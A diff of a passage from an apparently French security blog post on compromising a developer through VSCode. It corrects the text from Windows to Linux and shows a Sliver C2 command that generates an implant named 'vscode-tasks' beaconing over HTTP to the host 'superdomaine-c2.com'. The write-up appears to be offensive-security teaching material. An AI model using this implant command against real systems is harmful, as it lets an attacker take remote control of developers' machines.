@@ -24,7 +24,7 @@ Lancement du framework C2 sliver avec la commande `sliver` :
 ![lancement_sliver.png](/assets/images/2026-02-09-vscode-comment-pirater-un-developpeur-en-un-clic/lancement_sliver.png)
 
 
-Tout d'abord, l'implant (le *payload*) doit être généré. Dans le terminal Sliver, la commande suivante est entrée pour créer un binaire Windows communiquant via HTTP :
+Tout d'abord, l'implant (le *payload*) doit être généré. Dans le terminal Sliver, la commande suivante est entrée pour créer un binaire Linux communiquant via HTTP :
 ```bash
 generate --http superdomaine-c2.com --os linux -a amd64 --name vscode-tasks
 ```
